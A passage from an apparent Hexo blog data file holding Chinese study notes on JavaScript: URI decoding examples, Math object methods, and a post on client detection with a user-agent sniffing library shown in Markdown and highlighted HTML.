class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> uri = <span class=\"string\">\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//http%3A%2F%2Fwww.wrox.com%2Fillegal value.htm%23start</span></span><br><span class=\"line\">alert(<span class=\"built_in\">decodeURI</span>(uri));</span><br><span class=\"line\"><span class=\"comment\">//http://www.wrox.com/illegal value.htm#start</span></span><br><span class=\"line\">alert(<span class=\"built_in\">decodeURIComponent</span>(uri));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>eval()</code>，谨慎使用，防止代码注入。</p>\n</li>\n</ul>\n</li>\n<li>Math 对象<ul>\n<li><code>Math.PI</code>，π 的值。</li>\n<li><code>Math.min()</code>，最小值。</li>\n<li><code>Math.max()</code>，最大值。</li>\n<li><code>Math.ceil()</code>，向上舍入。</li>\n<li><code>Math.floor()</code>，向下舍入。</li>\n<li><code>Math.round()</code>，四舍五入。</li>\n<li><code>Math.random()</code>，随机数<code>[0,1)</code>。</li>\n<li><code>Math.abs()</code>，绝对值。</li>\n</ul>\n</li>\n</ol>"},{"title":"客户端检测（《JavaScript高级程序设计》）","date":"2019-01-23T15:31:35.000Z","updated":"2019-01-23T15:31:35.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n客户端检测，只有在万不得已的时候再使用，使用优先顺序为：能力检测>怪癖检测>用户代理检测。\n\n<!-- more -->\n\n# 详述\n\n## 能力检测\n\n在编写代码之前先检测特定浏览器的能力。\n\n## 怪癖检测\n\n怪癖实际上是浏览器实现中存在的 bug，只在某个怪癖会干 扰脚本运行的情况下使用。\n\n## 用户代理检测\n\n由于历史原因，现在各个浏览器的用户代理 userAgent 中包含重复交错的信息，因此封装一个检测库：\n\n```js\nvar client = (function() {\n  //呈现引擎\n  var engine = {\n    ie: 0,\n    gecko: 0,\n    webkit: 0,\n    khtml: 0,\n    opera: 0,\n    //完整的版本号\n    ver: null\n  };\n  //浏览器\n  var browser = {\n    //主要浏览器\n    ie: 0,\n    firefox: 0,\n    safari: 0,\n    konq: 0,\n    opera: 0,\n    chrome: 0,\n    //具体的版本号\n    ver: null\n  };\n  //平台、设备和操作系统\n  var system = {\n    win: false,\n    mac: false,\n    x11: false,\n    //移动设备\n    iphone: false,\n    ipod: false,\n    ipad: false,\n    ios: false,\n    android: false,\n    nokiaN: false,\n    winMobile: false,\n    //游戏系统\n    wii: false,\n    ps: false\n  };\n  //检测呈现引擎和浏览器\n  var ua = navigator.userAgent;\n  if (window.opera) {\n    engine.ver = browser.ver = window.opera.version();\n    engine.opera = browser.opera = parseFloat(engine.ver);\n  } else if (/AppleWebKit\\/(\\S+)/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.webkit = parseFloat(engine.ver);\n    //确定是Chrome 还是Safari\n    if (/Chrome\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.chrome = parseFloat(browser.ver);\n    } else if (/Version\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.safari = parseFloat(browser.ver);\n    } else {\n      //近似地确定版本号\n      var safariVersion = 1;\n      if (engine.webkit < 100) {\n        safariVersion = 1;\n      } else if (engine.webkit < 312) {\n        safariVersion = 1.2;\n      } else if (engine.webkit < 412) {\n        safariVersion = 1.3;\n      } else {\n        safariVersion = 2;\n      }\n      browser.safari = browser.ver = safariVersion;\n    }\n  } else if (/KHTML\\/(\\S+)/.test(ua) || /Konqueror\\/([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.khtml = browser.konq = parseFloat(engine.ver);\n  } else if (/rv:([^\\)]+)\\) Gecko\\/\\d{8}/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.gecko = parseFloat(engine.ver);\n    //确定是不是Firefox\n    if (/Firefox\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.firefox = parseFloat(browser.ver);\n    }\n  } else if (/MSIE ([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.ie = browser.ie = parseFloat(engine.ver);\n  }\n  //检测浏览器\n  browser.ie = engine.ie;\n  browser.opera = engine.opera;\n  //检测平台\n  var p = navigator.platform;\n  system.win = p.indexOf(\"Win\") == 0;\n  system.mac = p.indexOf(\"Mac\") == 0;\n  system.x11 = p == \"X11\" || p.indexOf(\"Linux\") == 0;\n  //检测Windows 操作系统\n  if (system.win) {\n    if (/Win(?:dows )?([^do]{2})\\s?(\\d+\\.\\d+)?/.test(ua)) {\n      if (RegExp[\"$1\"] == \"NT\") {\n        switch (RegExp[\"$2\"]) {\n          case \"5.0\":\n            system.win = \"2000\";\n            break;\n          case \"5.1\":\n            system.win = \"XP\";\n            break;\n          case \"6.0\":\n            system.win = \"Vista\";\n            break;\n          case \"6.1\":\n            system.win = \"7\";\n            break;\n          default:\n            system.win = \"NT\";\n            break;\n        }\n      } else if (RegExp[\"$1\"] == \"9x\") {\n        system.win = \"ME\";\n      } else {\n        system.win = RegExp[\"$1\"];\n      }\n    }\n  }\n  //移动设备\n  system.iphone = ua.indexOf(\"iPhone\") > -1;\n  system.ipod = ua.indexOf(\"iPod\") > -1;\n  system.ipad = ua.indexOf(\"iPad\") > -1;\n  system.nokiaN = ua.indexOf(\"NokiaN\") > -1;\n  //windows mobile\n  if (system.win == \"CE\") {\n    system.winMobile = system.win;\n  } else if (system.win == \"Ph\") {\n    if (/Windows Phone OS (\\d+.\\d+)/.test(ua)) {\n      system.win = \"Phone\";\n      system.winMobile = parseFloat(RegExp[\"$1\"]);\n    }\n  }\n  //检测iOS 版本\n  if (system.mac && ua.indexOf(\"Mobile\") > -1) {\n    if (/CPU (?:iPhone )?OS (\\d+_\\d+)/.test(ua)) {\n      system.ios = parseFloat(RegExp.$1.replace(\"_\", \".\"));\n    } else {\n      system.ios = 2; //不能真正检测出来，所以只能猜测\n    }\n  }\n  //检测Android 版本\n  if (/Android (\\d+\\.\\d+)/.test(ua)) {\n    system.android = parseFloat(RegExp.$1);\n  }\n  //游戏系统\n  system.wii = ua.indexOf(\"Wii\") > -1;\n  system.ps = /playstation/i.test(ua);\n  //返回这些对象\n  return {\n    engine: engine,\n    browser: browser,\n    system: system\n  };\n})();\n```\n","source":"_posts/2019/01/2019-01-23-JS高设3版-9.md","raw":"---\ntitle: 客户端检测（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-23 23:31:35\nupdated: 2019-01-23 23:31:35\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n客户端检测，只有在万不得已的时候再使用，使用优先顺序为：能力检测>怪癖检测>用户代理检测。\n\n<!-- more -->\n\n# 详述\n\n## 能力检测\n\n在编写代码之前先检测特定浏览器的能力。\n\n## 怪癖检测\n\n怪癖实际上是浏览器实现中存在的 bug，只在某个怪癖会干 扰脚本运行的情况下使用。\n\n## 用户代理检测\n\n由于历史原因，现在各个浏览器的用户代理 userAgent 中包含重复交错的信息，因此封装一个检测库：\n\n```js\nvar client = (function() {\n  //呈现引擎\n  var engine = {\n    ie: 0,\n    gecko: 0,\n    webkit: 0,\n    khtml: 0,\n    opera: 0,\n    //完整的版本号\n    ver: null\n  };\n  //浏览器\n  var browser = {\n    //主要浏览器\n    ie: 0,\n    firefox: 0,\n    safari: 0,\n    konq: 0,\n    opera: 0,\n    chrome: 0,\n    //具体的版本号\n    ver: null\n  };\n  //平台、设备和操作系统\n  var system = {\n    win: false,\n    mac: false,\n    x11: false,\n    //移动设备\n    iphone: false,\n    ipod: false,\n    ipad: false,\n    ios: false,\n    android: false,\n    nokiaN: false,\n    winMobile: false,\n    //游戏系统\n    wii: false,\n    ps: false\n  };\n  //检测呈现引擎和浏览器\n  var ua = navigator.userAgent;\n  if (window.opera) {\n    engine.ver = browser.ver = window.opera.version();\n    engine.opera = browser.opera = parseFloat(engine.ver);\n  } else if (/AppleWebKit\\/(\\S+)/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.webkit = parseFloat(engine.ver);\n    //确定是Chrome 还是Safari\n    if (/Chrome\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.chrome = parseFloat(browser.ver);\n    } else if (/Version\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.safari = parseFloat(browser.ver);\n    } else {\n      //近似地确定版本号\n      var safariVersion = 1;\n      if (engine.webkit < 100) {\n        safariVersion = 1;\n      } else if (engine.webkit < 312) {\n        safariVersion = 1.2;\n      } else if (engine.webkit < 412) {\n        safariVersion = 1.3;\n      } else {\n        safariVersion = 2;\n      }\n      browser.safari = browser.ver = safariVersion;\n    }\n  } else if (/KHTML\\/(\\S+)/.test(ua) || /Konqueror\\/([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.khtml = browser.konq = parseFloat(engine.ver);\n  } else if (/rv:([^\\)]+)\\) Gecko\\/\\d{8}/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.gecko = parseFloat(engine.ver);\n    //确定是不是Firefox\n    if (/Firefox\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.firefox = parseFloat(browser.ver);\n    }\n  } else if (/MSIE ([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.ie = browser.ie = parseFloat(engine.ver);\n  }\n  //检测浏览器\n  browser.ie = engine.ie;\n  browser.opera = engine.opera;\n  //检测平台\n  var p = navigator.platform;\n  system.win = p.indexOf(\"Win\") == 0;\n  system.mac = p.indexOf(\"Mac\") == 0;\n  system.x11 = p == \"X11\" || p.indexOf(\"Linux\") == 0;\n  //检测Windows 操作系统\n  if (system.win) {\n    if (/Win(?:dows )?([^do]{2})\\s?(\\d+\\.\\d+)?/.test(ua)) {\n      if (RegExp[\"$1\"] == \"NT\") {\n        switch (RegExp[\"$2\"]) {\n          case \"5.0\":\n            system.win = \"2000\";\n            break;\n          case \"5.1\":\n            system.win = \"XP\";\n            break;\n          case \"6.0\":\n            system.win = \"Vista\";\n            break;\n          case \"6.1\":\n            system.win = \"7\";\n            break;\n          default:\n            system.win = \"NT\";\n            break;\n        }\n      } else if (RegExp[\"$1\"] == \"9x\") {\n        system.win = \"ME\";\n      } else {\n        system.win = RegExp[\"$1\"];\n      }\n    }\n  }\n  //移动设备\n  system.iphone = ua.indexOf(\"iPhone\") > -1;\n  system.ipod = ua.indexOf(\"iPod\") > -1;\n  system.ipad = ua.indexOf(\"iPad\") > -1;\n  system.nokiaN = ua.indexOf(\"NokiaN\") > -1;\n  //windows mobile\n  if (system.win == \"CE\") {\n    system.winMobile = system.win;\n  } else if (system.win == \"Ph\") {\n    if (/Windows Phone OS (\\d+.\\d+)/.test(ua)) {\n      system.win = \"Phone\";\n      system.winMobile = parseFloat(RegExp[\"$1\"]);\n    }\n  }\n  //检测iOS 版本\n  if (system.mac && ua.indexOf(\"Mobile\") > -1) {\n    if (/CPU (?:iPhone )?OS (\\d+_\\d+)/.test(ua)) {\n      system.ios = parseFloat(RegExp.$1.replace(\"_\", \".\"));\n    } else {\n      system.ios = 2; //不能真正检测出来，所以只能猜测\n    }\n  }\n  //检测Android 版本\n  if (/Android (\\d+\\.\\d+)/.test(ua)) {\n    system.android = parseFloat(RegExp.$1);\n  }\n  //游戏系统\n  system.wii = ua.indexOf(\"Wii\") > -1;\n  system.ps = /playstation/i.test(ua);\n  //返回这些对象\n  return {\n    engine: engine,\n    browser: browser,\n    system: system\n  };\n})();\n```\n","slug":"2019-01-23-JS高设3版-9","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wf004awovv9qyd4kgd","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>客户端检测，只有在万不得已的时候再使用，使用优先顺序为：能力检测&gt;怪癖检测&gt;用户代理检测。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"能力检测\"><a href=\"#能力检测\" class=\"headerlink\" title=\"能力检测\"></a>能力检测</h2><p>在编写代码之前先检测特定浏览器的能力。</p>\n<h2 id=\"怪癖检测\"><a href=\"#怪癖检测\" class=\"headerlink\" title=\"怪癖检测\"></a>怪癖检测</h2><p>怪癖实际上是浏览器实现中存在的 bug，只在某个怪癖会干 扰脚本运行的情况下使用。</p>\n<h2 id=\"用户代理检测\"><a href=\"#用户代理检测\" class=\"headerlink\" title=\"用户代理检测\"></a>用户代理检测</h2><p>由于历史原因，现在各个浏览器的用户代理 userAgent 中包含重复交错的信息，因此封装一个检测库：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> client = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//呈现引擎</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> engine = &#123;</span><br><span class=\"line\">    ie: <span class=\"number\">0</span>,</span><br><span class=\"line\">    gecko: <span class=\"number\">0</span>,</span><br><span class=\"line\">    webkit: <span class=\"number\">0</span>,</span><br><span class=\"line\">    khtml: <span class=\"number\">0</span>,</span><br><span class=\"line\">    opera: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"comment\">//完整的版本号</span></span><br><span class=\"line\">    ver: <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> browser = &#123;</span><br><span class=\"line\">    <span class=\"comment\">//主要浏览器</span></span><br><span class=\"line\">    ie: <span class=\"number\">0</span>,</span><br><span class=\"line\">    firefox: <span class=\"number\">0</span>,</span><br><span class=\"line\">    safari: <span class=\"number\">0</span>,</span><br><span class=\"line\">    konq: <span class=\"number\">0</span>,</span><br><span class=\"line\">    opera: <span class=\"number\">0</span>,</span><br><span class=\"line\">    chrome: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"comment\">//具体的版本号</span></span><br><span class=\"line\">    ver: <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//平台、设备和操作系统</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> system = &#123;</span><br><span class=\"line\">    win: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    mac: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    x11: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"comment\">//移动设备</span></span><br><span class=\"line\">    iphone: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ipod: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ipad: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ios: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    android: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    nokiaN: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    winMobile: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"comment\">//游戏系统</span></span><br><span class=\"line\">    wii: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ps: <span class=\"literal\">false</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//检测呈现引擎和浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> ua = navigator.userAgent;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.opera) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">window</span>.opera.version();</span><br><span class=\"line\">    engine.opera = browser.opera = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/AppleWebKit\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.webkit = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">    <span class=\"comment\">//确定是Chrome 还是Safari</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Chrome\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.chrome = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/Version\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.safari = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">//近似地确定版本号</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> safariVersion = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">312</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1.2</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">412</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1.3</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">2</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      browser.safari = browser.ver = safariVersion;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/KHTML\\/(\\S+)/</span>.test(ua) || <span class=\"regexp\">/Konqueror\\/([^;]+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.khtml = browser.konq = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/rv:([^\\)]+)\\) Gecko\\/\\d&#123;8&#125;/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.gecko = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">    <span class=\"comment\">//确定是不是Firefox</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Firefox\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.firefox = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/MSIE ([^;]+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.ie = browser.ie = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测浏览器</span></span><br><span class=\"line\">  browser.ie = engine.ie;</span><br><span class=\"line\">  browser.opera = engine.opera;</span><br><span class=\"line\">  <span class=\"comment\">//检测平台</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> p = navigator.platform;</span><br><span class=\"line\">  system.win = p.indexOf(<span class=\"string\">\"Win\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  system.mac = p.indexOf(<span class=\"string\">\"Mac\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  system.x11 = p == <span class=\"string\">\"X11\"</span> || p.indexOf(<span class=\"string\">\"Linux\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"comment\">//检测Windows 操作系统</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.win) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Win(?:dows )?([^do]&#123;2&#125;)\\s?(\\d+\\.\\d+)?/</span>.test(ua)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>] == <span class=\"string\">\"NT\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$2\"</span>]) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"5.0\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"2000\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"5.1\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"XP\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"6.0\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"Vista\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"6.1\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"7\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"NT\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>] == <span class=\"string\">\"9x\"</span>) &#123;</span><br><span class=\"line\">        system.win = <span class=\"string\">\"ME\"</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        system.win = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//移动设备</span></span><br><span class=\"line\">  system.iphone = ua.indexOf(<span class=\"string\">\"iPhone\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ipod = ua.indexOf(<span class=\"string\">\"iPod\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ipad = ua.indexOf(<span class=\"string\">\"iPad\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.nokiaN = ua.indexOf(<span class=\"string\">\"NokiaN\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  <span class=\"comment\">//windows mobile</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.win == <span class=\"string\">\"CE\"</span>) &#123;</span><br><span class=\"line\">    system.winMobile = system.win;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (system.win == <span class=\"string\">\"Ph\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Windows Phone OS (\\d+.\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      system.win = <span class=\"string\">\"Phone\"</span>;</span><br><span class=\"line\">      system.winMobile = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测iOS 版本</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.mac &amp;&amp; ua.indexOf(<span class=\"string\">\"Mobile\"</span>) &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/CPU 